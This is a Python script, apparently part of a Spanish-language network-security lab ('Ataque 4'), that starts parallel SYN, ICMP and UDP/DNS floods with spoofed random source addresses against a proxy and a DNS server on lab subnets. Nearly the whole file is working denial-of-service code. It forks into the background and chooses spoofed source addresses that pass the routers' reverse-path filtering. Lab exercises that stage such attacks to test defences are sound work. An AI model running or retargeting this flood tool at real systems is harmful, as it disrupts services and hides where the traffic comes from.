#!/usr/bin/env python3
"""
Ataque 4 — SYN Flood + ICMP Flood
Dos floods en paralelo desde el proceso hijo (hilos):
  - SYN Flood  -> 192.168.4.2:80  (firewall_extern DNAT -> proxy nginx)
  - ICMP Flood -> 192.168.3.2     (DNS dnsmasq)
  - UDP Flood  -> 192.168.3.2:53  (DNS queries aleatorias)

IPs origen aleatorias para dificultar el filtrado por IP.
Stop: solo kill (sin estado persistente en las victimas).

Uso: python3 attack_flood.py [start|stop|status]
"""

import sys
import os
import signal
import time
import random
import threading

PID_FILE = "/tmp/attack_flood.pid"

# Destinos
SYN_TARGET_IP   = "192.168.4.2"   # firewall_extern externo (DNAT :80 -> proxy)
SYN_TARGET_PORT = 80
DNS_TARGET_IP   = "192.168.3.2"   # DNS server

RUNNING = True


def rand_ip():
    # Usar IPs de subredes conocidas en el lab para pasar el RPF (rp_filter=2)
    # de los routers intermedios (loose RPF descarta IPs sin ruta)
    pools = [
        ("192.168.1", 2, 253),
        ("192.168.2", 2, 253),
        ("192.168.3", 2, 253),
        ("192.168.5", 1, 254),
    ]
    prefix, lo, hi = random.choice(pools)
    return f"{prefix}.{random.randint(lo, hi)}"


def syn_flood():
    from scapy.all import IP, TCP, send
    print("[FLOOD] SYN flood iniciado -> "
          f"{SYN_TARGET_IP}:{SYN_TARGET_PORT}", flush=True)
    count = 0
    while RUNNING:
        pkt = (IP(src=rand_ip(), dst=SYN_TARGET_IP) /
               TCP(sport=random.randint(1024, 65535),
                   dport=SYN_TARGET_PORT, flags="S",
                   seq=random.randint(0, 2**32 - 1)))
        send(pkt, verbose=False)
        count += 1
        if count % 500 == 0:
            print(f"[FLOOD] SYN enviados: {count}", flush=True)


def icmp_flood():
    from scapy.all import IP, ICMP, send
    print(f"[FLOOD] ICMP flood iniciado -> {DNS_TARGET_IP}", flush=True)
    count = 0
    while RUNNING:
        pkt = IP(src=rand_ip(), dst=DNS_TARGET_IP) / ICMP(type=8)
        send(pkt, verbose=False)
        count += 1
        if count % 500 == 0:
            print(f"[FLOOD] ICMP enviados: {count}", flush=True)


def udp_flood():
    from scapy.all import IP, UDP, DNS, DNSQR, send
    print(f"[FLOOD] UDP/DNS flood iniciado -> {DNS_TARGET_IP}:53", flush=True)
    domains = ["WebDelLaboratorio.com.", "www.WebDelLaboratorio.com.",
               "vpn.WebDelLaboratorio.com.", "mail.WebDelLaboratorio.com."]
    count = 0
    while RUNNING:
        pkt = (IP(src=rand_ip(), dst=DNS_TARGET_IP) /
               UDP(sport=random.randint(1024, 65535), dport=53) /
               DNS(rd=1, qd=DNSQR(qname=random.choice(domains))))
        send(pkt, verbose=False)
        count += 1
        if count % 500 == 0:
            print(f"[FLOOD] UDP/DNS enviados: {count}", flush=True)


def attack_loop():
    global RUNNING
    RUNNING = True

    threads = [
        threading.Thread(target=syn_flood,  daemon=True),
        threading.Thread(target=icmp_flood, daemon=True),
        threading.Thread(target=udp_flood,  daemon=True),
    ]
    for t in threads:
        t.start()

    # Esperar SIGTERM
    def handle_sigterm(sig, frame):
        global RUNNING
        RUNNING = False
        print("[FLOOD] Senyal SIGTERM recibida. Parando...", flush=True)
        sys.exit(0)

    signal.signal(signal.SIGTERM, handle_sigterm)

    for t in threads:
        t.join()


def start():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        print(f"[!] El ataque ya esta activo (PID {pid}). Para primero con 'stop'.")
        sys.exit(1)

    pid = os.fork()
    if pid > 0:
        open(PID_FILE, "w").write(str(pid))
        print(f"[+] SYN/ICMP/UDP Flood iniciado (PID {pid})")
        print(f"    SYN  -> {SYN_TARGET_IP}:{SYN_TARGET_PORT} (DNAT -> proxy)")
        print(f"    ICMP -> {DNS_TARGET_IP} (DNS)")
        print(f"    UDP  -> {DNS_TARGET_IP}:53 (DNS)")
        print(f"    Verifica: docker exec proxy ss -s")
        print(f"    Verifica: docker exec dns tcpdump -i eth0 -nn 'udp port 53 or icmp'")
        print(f"    Log: tail -f /tmp/attack_flood.log")
        sys.exit(0)

    os.setsid()
    sys.stdout = open("/tmp/attack_flood.log", "w", buffering=1)
    sys.stderr = sys.stdout
    attack_loop()


def stop():
    if not os.path.exists(PID_FILE):
        print("[-] El ataque no esta activo.")
        return

    pid = int(open(PID_FILE).read().strip())
    try:
        os.kill(pid, signal.SIGTERM)
        time.sleep(1)
        # Si no murio, SIGKILL
        if os.path.exists(f"/proc/{pid}"):
            os.kill(pid, signal.SIGKILL)
    except ProcessLookupError:
        print("[!] Proceso no encontrado, limpiando PID file.")

    os.remove(PID_FILE)
    print("[+] Flood detenido. Sin estado persistente que limpiar.")


def status():
    if os.path.exists(PID_FILE):
        pid = open(PID_FILE).read().strip()
        alive = os.path.exists(f"/proc/{pid}")
        state = "activo" if alive else "PID file huerfano"
        print(f"[*] SYN/ICMP Flood: {state} (PID {pid})")
        if alive:
            print(f"    Log: tail -f /tmp/attack_flood.log")
            print(f"    Stats proxy: docker exec proxy ss -s")
            print(f"    Stats DNS:   docker exec dns netstat -su 2>/dev/null")
    else:
        print("[-] SYN/ICMP Flood: inactivo")


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in ("start", "stop", "status"):
        print(f"Uso: {sys.argv[0]} [start|stop|status]")
        sys.exit(1)
    {"start": start, "stop": stop, "status": status}[sys.argv[1]]()
